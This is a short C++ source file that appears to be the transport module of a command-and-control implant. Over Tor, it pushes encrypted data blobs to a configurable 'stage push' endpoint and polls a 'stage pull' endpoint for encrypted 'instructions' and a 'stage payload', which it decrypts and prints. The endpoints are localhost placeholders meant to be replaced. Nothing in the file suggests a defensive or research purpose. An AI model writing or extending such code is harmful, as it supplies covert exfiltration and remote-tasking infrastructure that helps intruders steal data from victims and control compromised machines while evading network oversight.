#include "blob_transport.h"
#include "http_client.h"       // our wrapper
#include "crypto_utils.h"      // encrypt/decrypt
#include <iostream>

// Replace with your real endpoint
const std::string STAGE_PUSH_URL = "http://localhost:8080/api/stage/push";
const std::string STAGE_PULL_URL = "http://localhost:8080/api/stage/pull";

bool send_via_tor(const std::string& encrypted_blob) {
    std::cout << "[*] Sending blob via TOR...\n";

    std::string json_payload = "{\"blob\": \"" + encrypted_blob + "\"}";

    std::string response = http_post(STAGE_PUSH_URL, json_payload, true);  // use TOR
    if (!response.empty()) {
        std::cout << "[+] Blob sent!\n";
        return true;
    } else {
        std::cerr << "[!] Failed to send blob.\n";
        return false;
    }
}

std::string receive_from_tor() {
    std::cout << "[*] Polling for instructions via TOR...\n";

    std::string response = http_get(STAGE_PULL_URL, true);  // use TOR
    if (response.empty()) {
        std::cout << "[*] No stage payload available.\n";
        return "";
    }

    std::string decrypted = decrypt_string(response);
    std::cout << "[+] Stage received and decrypted:\n" << decrypted << "\n";
    return decrypted;
}
